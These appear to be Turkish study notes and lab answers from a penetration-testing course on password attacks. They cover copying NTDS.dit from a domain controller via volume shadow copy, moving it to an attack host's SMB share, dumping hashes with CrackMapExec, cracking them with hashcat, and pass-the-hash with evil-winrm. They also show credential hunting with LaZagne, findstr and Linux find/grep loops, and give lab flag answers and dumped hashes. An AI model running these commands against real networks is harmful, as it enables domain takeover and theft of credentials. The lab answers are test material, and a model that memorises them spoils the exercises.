C: sürücüsünün veya yöneticinin AD'yi ilk kurarken seçtiği birimin [Volume Shadow Copy'sini (VSS) ](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)oluşturmak için vssadmin'i kullanabiliriz. NTDS'nin kurulum sırasında seçilen varsayılan konum olması nedeniyle C: üzerinde depolanması çok muhtemeldir, ancak konumu değiştirmek mümkündür. Bunun için VSS kullanıyoruz çünkü VSS, belirli bir uygulama ya da sistemi çökertmeye gerek kalmadan aktif olarak okunup yazılabilen birimlerin kopyalarını oluşturmak üzere tasarlanmıştır. VSS, birçok farklı yedekleme ve felaket kurtarma yazılımı tarafından işlemleri gerçekleştirmek için kullanılır.

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

#### **NTDS.dit dosyasının VSS'den kopyalanması**  

Daha sonra NTDS.dit dosyasını C: birim gölge kopyasından sürücüdeki başka bir konuma kopyalayarak NTDS.dit dosyasını saldırı hostumuza taşımaya hazırlanabiliriz.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

NTDS.dit dosyasını saldırı hostumuza kopyalamadan önce, saldırı hostumuzda bir SMB paylaşımı oluşturmak için daha önce öğrendiğimiz tekniği kullanmak isteyebiliriz.


#### **NTDS.dit dosyasını Saldırı Hostuna Aktarma**  

Şimdi `cmd.exe /c move` dosyayı hedef DC'den saldırı hostumuzdaki paylaşıma taşımak için kullanılabilir.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```


#### **Daha Hızlı Bir Yöntem:** **NTDS.dit'i Yakalamak için cme Kullanımı**  

Alternatif olarak, yukarıda gösterilen aynı adımları tek bir komutla gerçekleştirmek için CrackMapExec'i kullanmaktan faydalanabiliriz. Bu komut, NTDS.dit dosyasının içeriğini terminal oturumumuz içinde hızlı bir şekilde yakalamak ve dump etmek için VSS'yi kullanmamızı sağlar.

```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

SMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57    445     DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
SMB         10.129.201.57    445     DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.201.57    445     DC01           DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
SMB         10.129.201.57    445     DC01           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
SMB         10.129.201.57    445     DC01           WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
SMB         10.129.201.57    445     DC01           WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
SMB         10.129.201.57    445     DC01           WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
SMB         10.129.201.57    445     DC01           WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
SMB         10.129.201.57    445     DC01           WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
SMB         10.129.201.57    445     DC01           Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
SMB         10.129.201.57    445     DC01           Administrator:des-cbc-md5:618c1c5ef780cde3
SMB         10.129.201.57    445     DC01           DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
SMB         10.129.201.57    445     DC01           DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
SMB         10.129.201.57    445     DC01           DC01$:des-cbc-md5:a2852362e50eae92
SMB         10.129.201.57    445     DC01           krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
SMB         10.129.201.57    445     DC01           krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
SMB         10.129.201.57    445     DC01           krbtgt:des-cbc-md5:9bd5017fdcea8fae
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
     [+] Dumped 61 NTDS hashes to /home/bob/.cme/logs/DC01_10.10.15.30_2022-01-19_133529.ntds of which 15 were added to the database
```

## **Hash'leri Kırma ve Kimlik Bilgileri Elde Etme**  

Tüm NT hash'lerini içeren bir metin dosyası oluşturmaya devam edebiliriz veya belirli bir hash'i tek tek kopyalayıp bir terminal oturumuna yapıştırabilir ve Hashcat'i kullanarak hash'i ve bir parolayı açık metin olarak kırmayı deneyebiliriz.


#### Cracking a Single Hash with Hashcat

```shell-session
M1R4CKCK@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

Şimdiye kadar ele aldığımız tekniklerin çoğunda, elde ettiğimiz hash'leri kırma konusunda başarı elde ettik.  

`Peki ya bir hash'i kırmakta başarısız olursak?`

## **Pass-the-Hash ile İlgili Hususlar**  

Yine de `Pass-the-Hash` (`PtH`) adı verilen bir saldırı türünü kullanarak bir sistemle kimlik doğrulama girişiminde bulunmak için hash'leri kullanabiliriz. Bir PtH saldırısı, bir parola hash'i kullanarak bir kullanıcının kimliğini doğrulamak için [NTLM kimlik doğrulama protokolünden](“https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials”) yararlanır. Oturum açma biçimi olarak `kullanıcı adı`:`açık metin parolası` yerine `kullanıcı adı`:`parola` karması kullanabiliriz. İşte bunun nasıl çalışacağına dair bir örnek:


#### **Evil-WinRM ile Pass-the-Hash Örneği**

```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

Bu saldırıyı, bir hedefin ilk kez ele geçirilmesinden sonra bir ağ boyunca lateral olarak hareket etmemiz gerektiğinde kullanmayı deneyebiliriz. PtH hakkında daha fazla bilgi `AD Numaralandırma ve Saldırılar` modülünde ele alınacaktır.


Soru : Bir domain controller üzerinde depolanan ve tüm domain hesaplarının şifre hash'lerini içeren dosyanın adı nedir? (Biçim: ****.***)
Cevap : NTDS.dit

Soru : Okuma bölümündeki örnek çıktıdan Administrator kullanıcısı ile ilişkili NT hash'ini gönderin.
Cevap : 64f12cddaa88057e06a81b54e73b949b


Soru : Bir etkileşim üzerine birkaç sosyal medya sitesine girdiniz ve Inlanefreight çalışanlarının isimlerini buldunuz: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. Hedef domain controller'a karşı parola saldırılarınızı gerçekleştirmek için bu isimleri kullanmaya karar veriyorsunuz. Cevap olarak John Marston'ın kimlik bilgilerini gönderin. (Biçim: kullanıcı adı:parola, Harfe Duyarlı)
Cevap : 


1- 

**John Marston** ismi için tüm kullanıcı adı varyasyonları:

1. **İlk harf + soyisim**:
    
    - `jmarston`
2. **İlk harf + ikinci isim harfi + soyisim**:
    
    - `jmmarston`
3. **İsim + soyisim**:
    
    - `johnmarston`
4. **İsim.Soyisim**:
    
    - `john.marston`
5. **Soyisim.İsim**:
    
    - `marston.john`
6. **Takma ad** (isteğe bağlı bir örnek):
    
    - `marstontheoutlaw`



![Pasted image 20241103182637.png](/img/user/resimler/Pasted%20image%2020241103182637.png)

Ek olarak bunuda ekledik . 

![Pasted image 20241103182954.png](/img/user/resimler/Pasted%20image%2020241103182954.png)

![Pasted image 20241103183409.png](/img/user/resimler/Pasted%20image%2020241103183409.png)

![Pasted image 20241103183417.png](/img/user/resimler/Pasted%20image%2020241103183417.png)

![Pasted image 20241103184933.png](/img/user/resimler/Pasted%20image%2020241103184933.png)

==jmarston:P@ssword!==




Soru : NTDS.dit dosyasını yakalayın ve hash'lerin dökümünü alın. Jennifer Stapleton'ın parolasını kırmak için bu bölümde öğretilen teknikleri kullanın. Cevap olarak açık metin şifresini gönderin. (Biçim: Harfe Duyarlı)

cevap : 

![Pasted image 20241103185151.png](/img/user/resimler/Pasted%20image%2020241103185151.png)

![Pasted image 20241103185246.png](/img/user/resimler/Pasted%20image%2020241103185246.png)

![Pasted image 20241103185302.png](/img/user/resimler/Pasted%20image%2020241103185302.png)


![Pasted image 20241103185447.png](/img/user/resimler/Pasted%20image%2020241103185447.png)

![Pasted image 20241103185734.png](/img/user/resimler/Pasted%20image%2020241103185734.png)

92fd67fd2f49d0e83744aa82363f021b

![Pasted image 20241103185923.png](/img/user/resimler/Pasted%20image%2020241103185923.png)

![Pasted image 20241103185938.png](/img/user/resimler/Pasted%20image%2020241103185938.png)



# **Windows'ta Kimlik Bilgisi Avcılığı**  

GUI veya CLI aracılığıyla bir hedef Windows makinesine eriştikten sonra, yaklaşımımıza kimlik bilgisi avcılığını dahil ederek önemli ölçüde fayda sağlayabiliriz. Kimlik bilgisi`avcılığı`, kimlik bilgilerini keşfetmek için dosya sisteminde ve çeşitli uygulamalar aracılığıyla ayrıntılı aramalar yapma işlemidir. Bu kavramı anlamak için kendimizi bir senaryoya yerleştirelim. Bir BT yöneticisinin Windows 10 workstation'ına RDP aracılığıyla erişim sağladık.

## **Centric'te Ara**  

Windows'ta kullanabileceğimiz araçların birçoğu arama işlevine sahiptir. Günümüzde ve çağımızda, çoğu uygulama ve işletim sisteminde yerleşik olarak bulunan arama merkezli özellikler vardır, bu nedenle bunu bir etkileşimde avantajımıza kullanabiliriz. Bir kullanıcı şifrelerini sistemde bir yere kaydetmiş olabilir. Hatta çeşitli dosyalarda bulunabilecek varsayılan kimlik bilgileri bile olabilir. Kimlik bilgilerini ararken hedef sistemin nasıl kullanıldığına dair bildiklerimizi temel almak akıllıca olacaktır. Bu durumda, bir BT yöneticisinin workstation'ına erişimimiz olduğunu biliyoruz.  

`Bir BT yöneticisi günlük olarak ne yapıyor olabilir ve bu görevlerden hangileri kimlik bilgileri gerektirebilir?`  

Bu soruyu ve değerlendirmeyi, rastgele tahmin ihtiyacını mümkün olduğunca azaltmak için aramamızı hassaslaştırmak için kullanabiliriz.


#### **Aranacak Anahtar Terimler**  

İster GUI'ye ister CLI'ya erişimimiz olsun, arama yapmak için kullanabileceğimiz bazı araçlara sahip olacağımızı biliyoruz, ancak tam olarak ne aradığımız da aynı derecede önemlidir. İşte bazı kimlik bilgilerini keşfetmemize yardımcı olabilecek kullanabileceğimiz bazı yararlı anahtar terimler:

![Pasted image 20241103220849.png](/img/user/resimler/Pasted%20image%2020241103220849.png)

BT yöneticisinin workstation'ında arama yapmak için bu anahtar terimlerden bazılarını kullanalım.

## **Search Tools**

GUI'ye erişim sağlandığında, yukarıda bahsedilen anahtar kelimelerden bazılarını kullanarak hedefteki dosyaları bulmak için `Windows Arama` 'yı kullanmayı denemeye değer.

![Pasted image 20241103220923.png](/img/user/resimler/Pasted%20image%2020241103220923.png)

Varsayılan olarak, arama çubuğuna girilen anahtar terimi içeren dosyalar ve uygulamalar için çeşitli işletim sistemi ayarlarını ve dosya sistemini arayacaktır.


Web tarayıcılarının veya diğer yüklü uygulamaların güvensiz bir şekilde saklayabileceği kimlik bilgilerini hızlı bir şekilde keşfetmek için [Lazagne](https://github.com/AlessandroZ/LaZagne) gibi üçüncü taraf araçlardan da yararlanabiliriz. Lazagne'nin [bağımsız](“https://github.com/AlessandroZ/LaZagne/releases/”) bir [kopyasını](“https://github.com/AlessandroZ/LaZagne/releases/”) saldırı hostumuzda tutmak faydalı olacaktır, böylece onu hızlı bir şekilde hedefe aktarabiliriz. `Lazagne.exe` bu senaryoda bizim için yeterli olacaktır. Dosyayı saldırı hostumuzdan hedefe kopyalamak için RDP istemcimizi kullanabiliriz. Eğer `xfreerdp` kullanıyorsak tek yapmamız gereken kopyalamak ve kurduğumuz RDP oturumuna yapıştırmaktır.

Lazagne.exe hedefte olduğunda, komut istemini veya PowerShell'i açabilir, dosyanın yüklendiği dizine gidebilir ve aşağıdaki komutu çalıştırabiliriz:


#### **Running Lazagne All**

```cmd-session
C:\Users\bob\Desktop> start lazagne.exe all
```

Bu, Lazagne'yi çalıştıracak ve dahil edilen `tüm` modülleri çalıştıracaktır. Arka planda ne yaptığını incelemek için `-vv` seçeneğini ekleyebiliriz `.` Enter tuşuna bastığımızda, başka bir komut istemi açacak ve sonuçları görüntüleyecektir.


#### Lazagne Output

```cmd-session
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

Eğer `-vv` seçeneğini kullanırsak, Lazagne'nin desteklediği tüm yazılımlardan parola toplama girişimlerini görebiliriz. Lazagne'nin kimlik bilgilerini toplamaya çalışacağı tüm yazılımları görmek için GitHub sayfasındaki desteklenen yazılımlar bölümüne de bakabiliriz. Kimlik bilgilerini açık metin olarak elde etmenin ne kadar kolay olabileceğini görmek biraz şok edici olabilir. Bunun büyük bir kısmı, birçok uygulamanın kimlik bilgilerini güvenli olmayan bir şekilde saklamasına bağlanabilir.


#### **findstr kullanarak**  

Birçok dosya türünde kalıplardan arama yapmak için [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) 'yi de kullanabiliriz. Yaygın anahtar terimleri aklımızda tutarak, bir Windows hedefindeki kimlik bilgilerini keşfetmek için bu komutun varyasyonlarını kullanabiliriz:

```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## **Ek Hususlar**  

Windows işletim sistemlerinde kimlik bilgilerini aramak için kullanabileceğimiz binlerce araç ve anahtar terim vardır. Hangilerini kullanmayı seçeceğimizin öncelikle bilgisayarın işlevine bağlı olacağını bilin. Eğer bir Windows Sunucu işletim sistemine girersek, Windows Masaüstü işletim sistemine girdiğimizden farklı bir yaklaşım kullanabiliriz. Sistemin nasıl kullanıldığına her zaman dikkat edin; bu, nereye bakmamız gerektiğini bilmemize yardımcı olacaktır. Bazen araçlarımız çalışırken dosya sistemindeki dizinleri gezerek ve listeleyerek kimlik bilgilerini bile bulabiliriz.

Kimlik bilgisi avcılığı yaparken aklımızda tutmamız gereken diğer bazı yerler şunlardır:  

- SYSVOL paylaşımındaki Group Policy'de parolalar  
    
- SYSVOL paylaşımındaki komut dosyalarındaki parolalar  
    
- BT paylaşımlarındaki komut dosyalarında parola  
    
- Geliştirme makineleri ve BT paylaşımlarındaki web.config dosyalarındaki parolalar  
    
- unattend.xml  
    
- AD kullanıcı veya bilgisayar açıklaması alanlarındaki parolalar  
    
- KeePass veritabanları --> hash çekin, kırın ve bir sürü erişim elde edin.  
    
- Kullanıcı sistemlerinde ve paylaşımlarında bulunur  
    
- Kullanıcı sistemlerinde, paylaşımlarda, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)'te bulunan pass.txt, passwords.docx, passwords.xlsx gibi dosyalar


Soru : Bob, SSH aracılığıyla Anahtarlara bağlanmak için hangi şifreyi kullanıyor? (Biçim: Büyük/Küçük Harfe Duyarlı)
Cevap :  WellConnected123

1- Search kısmına pass yazınca bir apache database gibi birşey çıktı oradan buldum . 


Soru : Bob'un kullandığı GitLab erişim kodu nedir? (Biçim: Büyük/Küçük Harfe Duyarlı)
Cevap : 
1- Serach kısmına gitlab yazınca cıkan txt dosyasında . 

Soru : Bob dosya sunucusuna bağlanmak için WinSCP ile hangi kimlik bilgilerini kullanıyor? (Biçim: kullanıcı adı:parola, Harfe Duyarlı)

Cevap : 

![Pasted image 20241103224448.png](/img/user/resimler/Pasted%20image%2020241103224448.png)

![Pasted image 20241103224436.png](/img/user/resimler/Pasted%20image%2020241103224436.png)


Soru : Yeni oluşturulan her Inlanefreight Domain kullanıcı hesabının varsayılan parolası nedir? (Biçim: Harfe Duyarlı)

Cevap : Inlanefreightisgreat2022

1 - Eğer her yeni domain kullanıcısı için otomatik olarak bir varsayılan parola atanıyorsa, bu işlem büyük olasılıkla **PowerShell scriptleri (.ps1)** veya **bat dosyaları (.bat)** gibi otomatikleştirme scriptleri aracılığıyla yapılıyordur.

![Pasted image 20241103225416.png](/img/user/resimler/Pasted%20image%2020241103225416.png)

![Pasted image 20241103225512.png](/img/user/resimler/Pasted%20image%2020241103225512.png)


Soru : Edge-Router'a erişim için kimlik bilgileri nelerdir? (Format: kullanıcı adı:şifre, Harfe Duyarlı)
Cevap : edgeadmin:Edge@dmin123!

Hemen aynı dizinin bir alt dizininde şöyle bir dosya buldum . 

![Pasted image 20241103225913.png](/img/user/resimler/Pasted%20image%2020241103225913.png)
edgeadmin:Edge@dmin123!



# **Linux'ta Kimlik Bilgisi Avcılığı**  

Sisteme erişim sağladıktan sonra kimlik bilgilerini aramak ilk adımlardan biridir. Bu düşük asılı meyveler bize saniyeler veya dakikalar içinde yükseltilmiş ayrıcalıklar verebilir. Diğer şeylerin yanı sıra bu, burada ele alacağımız local privilege escalation sürecinin bir parçasıdır. Ancak, burada tüm olası durumları kapsamaktan uzak olduğumuzu ve bu nedenle farklı yaklaşımlara odaklandığımızı belirtmek önemlidir.  

Örneğin, savunmasız bir web uygulaması aracılığıyla bir sisteme başarılı bir şekilde erişim sağladığımızı ve bu nedenle bir reverse shell elde ettiğimizi düşünebiliriz. Bu nedenle, ayrıcalıklarımızı en verimli şekilde artırmak için, hedefimizde oturum açmak için kullanabileceğimiz parolaları veya hatta tüm kimlik bilgilerini arayabiliriz. Bize dört kategoriye ayırdığımız kimlik bilgilerini sağlayabilecek çeşitli kaynaklar vardır. Bunlar aşağıdakileri içerir, ancak bunlarla sınırlı değildir:

![Pasted image 20241104001535.png](/img/user/resimler/Pasted%20image%2020241104001535.png)

Tüm bu kategorileri sıralamak, sistemdeki mevcut kullanıcıların kimlik bilgilerini kolaylıkla bulma olasılığını artırmamızı sağlayacaktır. Her zaman farklı sonuçlar göreceğimiz sayısız farklı durum vardır. Bu nedenle, yaklaşımımızı ortamın koşullarına göre uyarlamalı ve büyük resmi aklımızda tutmalıyız. Her şeyden önce, sistemin nasıl çalıştığını, odağını, ne amaçla var olduğunu ve iş mantığında ve genel ağda nasıl bir rol oynadığını akılda tutmak çok önemlidir. Örneğin, bunun izole bir veritabanı sunucusu olduğunu varsayalım. Bu durumda, sadece birkaç kişinin erişimine izin verilen verilerin yönetiminde hassas bir arayüz olduğu için orada normal kullanıcılar bulmamız gerekmeyecektir.

## **Files**

Linux'un temel ilkelerinden biri her şeyin bir dosya olduğudur. Bu nedenle, bu kavramı akılda tutmak ve gereksinimlerimize göre uygun dosyaları aramak, bulmak ve filtrelemek çok önemlidir. Birkaç dosya kategorisini teker teker aramalı, bulmalı ve incelemeliyiz. Bu kategoriler aşağıdaki gibidir:

![Pasted image 20241104004750.png](/img/user/resimler/Pasted%20image%2020241104004750.png)

Konfigürasyon dosyaları, Linux dağıtımlarındaki hizmetlerin fonksiyonelliğinin çekirdeğini oluşturur. Çoğu zaman okuyabileceğimiz kimlik bilgilerini bile içerirler. Bu bilgiler aynı zamanda hizmetin nasıl çalıştığını ve gereksinimlerini tam olarak anlamamızı sağlar. Genellikle, yapılandırma dosyaları aşağıdaki üç dosya uzantısı (`.config`, `.conf`, `.cnf`) ile işaretlenir. Ancak, bu yapılandırma dosyaları veya ilişkili uzantı dosyaları yeniden adlandırılabilir, bu da bu dosya uzantılarının mutlaka gerekli olmadığı anlamına gelir. Ayrıca, bir hizmet yeniden derlenirken bile, temel yapılandırma için gerekli dosya adı değiştirilebilir ve bu da aynı etkiye neden olur. Bununla birlikte, bu sık karşılaşmayacağımız nadir bir durumdur, ancak bu olasılık araştırmamızın dışında bırakılmamalıdır.  

Herhangi bir sistem numaralandırmasının en önemli kısmı, sisteme genel bir bakış elde etmektir. Bu nedenle, ilk adım sistemdeki tüm olası yapılandırma dosyalarını bulmak olmalıdır, daha sonra bunları tek tek daha ayrıntılı olarak inceleyebilir ve analiz edebiliriz. Bu yapılandırma dosyalarını bulmak için birçok yöntem vardır ve aşağıdaki yöntemle aramamızı bu üç dosya uzantısına indirgediğimizi göreceğiz.


#### Configuration Files

```shell-session
1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```

İsteğe bağlı olarak, sonucu bir metin dosyasına kaydedebilir ve bunu dosyaları tek tek incelemek için kullanabiliriz. Başka bir seçenek de belirtilen dosya uzantısıyla bulunan her dosya için taramayı doğrudan çalıştırmak ve içeriğin çıktısını almaktır. Bu örnekte, `.cnf` dosya uzantısına sahip her dosyada üç kelime (`user`, `password`, `pass`) arıyoruz.

#### Credentials in Configuration Files

```shell-session
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
```

Bu basit aramayı diğer dosya uzantılarına da uygulayabiliriz. Ek olarak, bu arama türünü farklı dosya uzantılarına sahip dosyalarda depolanan veritabanlarına uygulayabilir ve daha sonra bunları okuyabiliriz.


#### Databases

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
```

Bulunduğumuz ortama ve hostun amacına bağlı olarak, genellikle sistemdeki belirli prosesler hakkında notlar bulabiliriz. Bunlar genellikle birçok farklı access point'in listesini ve hatta kimlik bilgilerini içerir. Ancak, masaüstünde ya da alt klasörlerinde değil de sistemde bir yerde saklanıyorsa notları hemen bulmak genellikle zordur. Bunun nedeni, herhangi bir şekilde adlandırılabilmeleri ve `.txt` gibi belirli bir dosya uzantısına sahip olmaları gerekmemesidir. Bu nedenle, bu durumda, `.txt` dosya uzantısını içeren dosyaları ve hiçbir dosya uzantısı olmayan dosyaları aramamız gerekir.

```shell-session
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
...SNIP...
```

Komut dosyaları genellikle son derece hassas bilgiler ve prosesler içeren dosyalardır. Diğer şeylerin yanı sıra, bunlar aynı zamanda prosesleri otomatik olarak çağırabilmek ve yürütebilmek için gerekli olan kimlik bilgilerini de içerir. Aksi takdirde, yönetici veya geliştirici, komut dosyası veya derlenmiş program her çağrıldığında ilgili parolayı girmek zorunda kalacaktır.

#### Scripts

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

